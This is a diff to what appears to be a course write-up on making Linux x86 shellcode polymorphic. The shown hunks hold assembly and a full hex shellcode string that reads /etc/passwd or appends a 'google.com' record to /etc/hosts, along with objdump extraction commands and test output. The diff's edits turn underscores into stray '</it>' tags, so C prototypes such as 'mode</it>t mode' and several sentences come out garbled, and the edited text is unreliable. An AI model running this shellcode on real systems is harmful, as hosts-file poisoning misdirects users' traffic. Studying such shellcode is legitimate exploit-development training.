@@ -96,10 +96,10 @@ tags:
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">mov ebx, esp</pre>
 <p style="text-align:justify;">Additionally, for the sake of polymorphism the following <strong>open</strong> system call will be used instead of the one discussed before which initially used from the original <em>shellcode</em>.  </p>
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-int open(const char *pathname, int flags, mode_t mode);
+int open(const char *pathname, int flags, mode</it>t mode);
 </pre>
 
-<p style="text-align:justify;">The function above has one extra argument named <strong>mode</strong> of type mode_t. The argument <strong>mode</strong> represents the permissions in case a new file is created using the <strong>open</strong> function call with the <strong>O_CREAT</strong> flag. If a new file is not being created then this argument is ignored. In this case the <em>shellcode</em> only reads from <strong>/etc/passwd</strong> file which is a system file already created from the Linux operating system. According to the <strong>open</strong> function prototype one extra instruction will be added that will assign the extra mode to the opened file.</p>
+<p style="text-align:justify;">The function above has one extra argument named <strong>mode</strong> of type mode</it>t. The argument <strong>mode</strong> represents the permissions in case a new file is created using the <strong>open</strong> function call with the <strong>O_CREAT</strong> flag. If a new file is not being created then this argument is ignored. In this case the <em>shellcode</em> only reads from <strong>/etc/passwd</strong> file which is a system file already created from the Linux operating system. According to the <strong>open</strong> function prototype one extra instruction will be added that will assign the extra mode to the opened file.</p>
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#99cc00;"><span style="color:#00ffff;">;Altered Shellcode Instruction</span><br /><span style="color:#00ff00;">mov dx, 0x1bc</span></span></pre>
 <p style="text-align:justify;">The above instruction is adding the permission mode <strong>0x1bc</strong> in hex which is <strong>444</strong> in decimal that defines the read, permissions to the opened file for the owner, the group and others. Nevertheless, because the file already exists the instruction above is useless thus providing a polymorphic change to the <em>shellcode</em>. </p>
 <p style="text-align:justify;">Then the <strong>int 0x80 </strong>instruction used to execute the system call referred by the <strong>0x5</strong> value that moved earlier inside the lower byte register <strong>al</strong>.</p>
@@ -214,10 +214,10 @@ ret();
 <p style="text-align:justify;">Following, the <strong>creat()</strong> system call is shown and the full synopsis can be found at <a href="https://linux.die.net/man/3/creat">creat(3)</a> man page</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><
-int creat(const char *pathname, mode_t mode);
+int creat(const char *pathname, mode</it>t mode);
 </pre>
 
-<p style="text-align:justify;">The <strong>creat()</strong> system call returns an integer. There are also two arguments passed to the function, the first is the <strong>pathname</strong> of type<em> char*</em> and the second one is the <strong>mode</strong> of type <em>mode_t</em>. Additionally, according to <strong>creat()</strong> general description, the <strong>creat()</strong> system call is equivalent with the following call :</p>
+<p style="text-align:justify;">The <strong>creat()</strong> system call returns an integer. There are also two arguments passed to the function, the first is the <strong>pathname</strong> of type<em> char*</em> and the second one is the <strong>mode</strong> of type <em>mode</it>t</em>. Additionally, according to <strong>creat()</strong> general description, the <strong>creat()</strong> system call is equivalent with the following call :</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><
 open(path, O_WRONLY|O_CREAT|O_TRUNC, mode)
@@ -367,7 +367,7 @@ mov al,0x1
 int 0x80
 </pre>
 
-The _final polymorphic_ version of the original _shellcode_ is shown below
+The _final polymorphic_ version of the original <it>shellcode</it> is shown below
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 global _start
@@ -409,7 +409,7 @@ _start:
 
 
 <p style="text-align:justify;">
-Now that the writing of the polymorphic _shellcode_ version finished, a test will run in order to check if it works. Following, checking about null bytes using <b>objdump</b> as shown below
+Now that the writing of the polymorphic <it>shellcode</it> version finished, a test will run in order to check if it works. Following, checking about null bytes using <b>objdump</b> as shown below
 </p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d polyaslr -M intel
@@ -462,7 +462,7 @@ Disassembly of section .text:
 </pre>
 
 <p style="text-align:justify;">
-From the output above it seems that there are no null bytes around, so using <b>objdump</b> the production of the _shellcode_ can be done as follows
+From the output above it seems that there are no null bytes around, so using <b>objdump</b> the production of the <it>shellcode</it> can be done as follows
 </p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d ./polyaslr|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
@@ -470,7 +470,7 @@ From the output above it seems that there are no null bytes around, so using <b>
 </pre>
 
 <p style="text-align:justify;">
-Afterwards the produced _shellcode_ will be added into a C program named <b>sh.c</b> in order to deliver the execution of the polimorphic shellcode.
+Afterwards the produced <it>shellcode</it> will be added into a C program named <b>sh.c</b> in order to deliver the execution of the polimorphic shellcode.
 </p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
@@ -515,7 +515,7 @@ Shellcode Length: 124
 0
 </pre>
 
-As previously seen in this article, the length of the new _shellcode_ will be checked in order to be align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original _shellcode_. The calculation below shows that the exercise rule is followed.
+As previously seen in this article, the length of the new <it>shellcode</it> will be checked in order to be align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original <it>shellcode</it>. The calculation below shows that the exercise rule is followed.
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 original shelcode length : 83
@@ -619,7 +619,7 @@ jmp short _ldata ;jmp-call-pop technique to load the map
 </pre>
 
 <p style="text-align:justify;">
-The above instructions have been altered in order to achieve polymorphism. The technique <b>jmp-pop-call</b> will still remains the same with changes only in label names. Also, the <b>mul ecx</b> replaced with , <b>cdq</b> and <b>xor eax, eax ,</b> zeroing out the <b>eax</b> and <b>edx</b> registers accordingly. Additionally, the <b>push</b> instruction has been altered using <b>mov</b> instruction and the file permissions value <b>0x401</b> in hex has been splitted into two values , <b>0x3b1</b> and <b>0x50</b> instead of one, adding them together using the <b>add</b> instruction at the 8bits register <b>cx**. The <b>xchg</b> instruction has been changed to <b>mov</b> instruction as the <b>ebx</b> will be assigned with the value <b>0x3</b> which represents the hosts file descriptor returned from the <b>open()</b> system call. The <b>xchg</b> used from _shellcode_ writer to reduce the <it>shellcode</it> length as it needs two bytes, against the three bytes that <b>mov</b> needs. Also , the _shellcode_ writer uses <b>push</b> and <b>pop</b> to load the <b>0x4</b> immediate value into <b>eax</b> register indicating the <b>write()</b> system call. The alteration here is that the <b>push</b> and <b>pop</b> replaced with <b>mov</b> and also the location of the instruction moved after the <b>jmp short</b> instruction and before the <b>int 0x80</b> instruction.
+The above instructions have been altered in order to achieve polymorphism. The technique <b>jmp-pop-call</b> will still remains the same with changes only in label names. Also, the <b>mul ecx</b> replaced with , <b>cdq</b> and <b>xor eax, eax ,</b> zeroing out the <b>eax</b> and <b>edx</b> registers accordingly. Additionally, the <b>push</b> instruction has been altered using <b>mov</b> instruction and the file permissions value <b>0x401</b> in hex has been splitted into two values , <b>0x3b1</b> and <b>0x50</b> instead of one, adding them together using the <b>add</b> instruction at the 8bits register <b>cx**. The <b>xchg</b> instruction has been changed to <b>mov</b> instruction as the <b>ebx</b> will be assigned with the value <b>0x3</b> which represents the hosts file descriptor returned from the <b>open()</b> system call. The <b>xchg</b> used from <it>shellcode</it> writer to reduce the <it>shellcode</it> length as it needs two bytes, against the three bytes that <b>mov</b> needs. Also , the <it>shellcode</it> writer uses <b>push</b> and <b>pop</b> to load the <b>0x4</b> immediate value into <b>eax</b> register indicating the <b>write()</b> system call. The alteration here is that the <b>push</b> and <b>pop</b> replaced with <b>mov</b> and also the location of the instruction moved after the <b>jmp short</b> instruction and before the <b>int 0x80</b> instruction.
 
 Furthermore, the label <b>_load_data</b> will be changed with <b>_ldata</b> at <b>jmp short</b> instruction. Also, as already mentioned the <b>mov</b> instruction above is doing the same thing as the <b>push</b> instruction, and that because the <b>push</b> instruction is decrementing the stack pointer by the operand size, then moves the operand to the location pointed by the stack pointer. Furthermore, the <b>sub ebx, 0x10</b> instruction used to make room for four local variables in the stack to place the string <b>/etc///hosts</b> and the <b>mov ebx, esp</b> instruction used for stack alignment setting the pointer at the top of the stack.
 
@@ -665,7 +665,7 @@ add al,0x2
 int 0x80 ;syscall to close the file
 </pre>
 
-The above instructions from the original _shellcode_, <b>pop</b> and <b>push</b> are changed with the <b>add</b> instruction. The add instruction adds the <b>0x2</b> immediate value with the <b>0x4</b> value previously assigned at the lower byte register <b>al</b> in order to execute the <b>close</b> system call with <b>int 0x80</b> instruction.
+The above instructions from the original <it>shellcode</it>, <b>pop</b> and <b>push</b> are changed with the <b>add</b> instruction. The add instruction adds the <b>0x2</b> immediate value with the <b>0x4</b> value previously assigned at the lower byte register <b>al</b> in order to execute the <b>close</b> system call with <b>int 0x80</b> instruction.
 
 The next instructions to be altered are representing the <b>exit</b> system call.
 
@@ -684,7 +684,7 @@ mov al,0x1
 int 0x80 ;syscall to exit
 </pre>
 
-The above instructions from the original _shellcode_, <b>pop</b> and <b>push</b> are changed with the <b>xor</b> and <b>mov</b> instructions. The <b>xor</b> instruction used to zero out the <b>eax</b> register and the <b>mov</b> instruction used to assign the immediate value at the lower byte <b>al</b> register in order to execute the exit system call with <b>int 0x80</b> instruction.
+The above instructions from the original <it>shellcode</it>, <b>pop</b> and <b>push</b> are changed with the <b>xor</b> and <b>mov</b> instructions. The <b>xor</b> instruction used to zero out the <b>eax</b> register and the <b>mov</b> instruction used to assign the immediate value at the lower byte <b>al</b> register in order to execute the exit system call with <b>int 0x80</b> instruction.
 
 The final instructions exist inside the <b>load_data</b> label of the original <it>shellcode</it> and will be altered as follows :
 
@@ -755,7 +755,7 @@ _ldata:
  message db "127.1.1.1 google.com",0x0A
 </pre>
 
-Proceeding further, the polymorphic _shellcode_ is ready for testing. First, the program will be compiled using the following shell script
+Proceeding further, the polymorphic <it>shellcode</it> is ready for testing. First, the program will be compiled using the following shell script
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># cat compile.sh
 #!/bin/bash
 
@@ -826,7 +826,7 @@ Disassembly of section .text:
 8049063: 0d .byte 0xd
 </pre>
 
-As it's shown above, it is all good with the polymorphic _shellcode,_ so it's everything ready to proceed further and run it. Before doing that the shellcode must be produced using <b>objdump</b> as follows
+As it's shown above, it is all good with the polymorphic <it>shellcode,_ so it's everything ready to proceed further and run it. Before doing that the shellcode must be produced using <b>objdump</b> as follows
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d ./omap|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc9\x31\xc0\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x6f\x73\x74\x73\xc7\x44\x24\xf4\x2f\x2f\x2f\x68\xc7\x44\x24\xf0\x2f\x65\x74\x63\x83\xec\x10\x89\xe3\x66\xb9\xb1\x03\x66\x83\xc1\x50\xb0\x05\xcd\x80\x89\xc3\x31\xc0\xeb\x14\x59\xb2\x12\x80\xc2\x02\xb0\x04\xcd\x80\x04\x02\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe7\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x0a\x0d"
@@ -864,7 +864,7 @@ Next the executable will be compiled and run as seen below
 Shellcode Length: 102
 </pre>
 
-Now that the _shellcode_ executed, the **/etc/hosts** file will be checked to see if the new record has been inserted successfully.
+Now that the <it>shellcode</it> executed, the **/etc/hosts** file will be checked to see if the new record has been inserted successfully.
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 127.0.0.1 localhost
@@ -878,7 +878,7 @@ ff02::2 ip6-allrouters
 127.1.1.1 google.com
 </pre>
 
-As&nbsp; seen previously in this article, the length of the new _shellcode_ must be checked in order to align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original shellcode. The calculation below shows that the exercise rule is followed. point
+As&nbsp; seen previously in this article, the length of the new <it>shellcode</it> must be checked in order to align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original shellcode. The calculation below shows that the exercise rule is followed. point
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 original shelcode length : 77
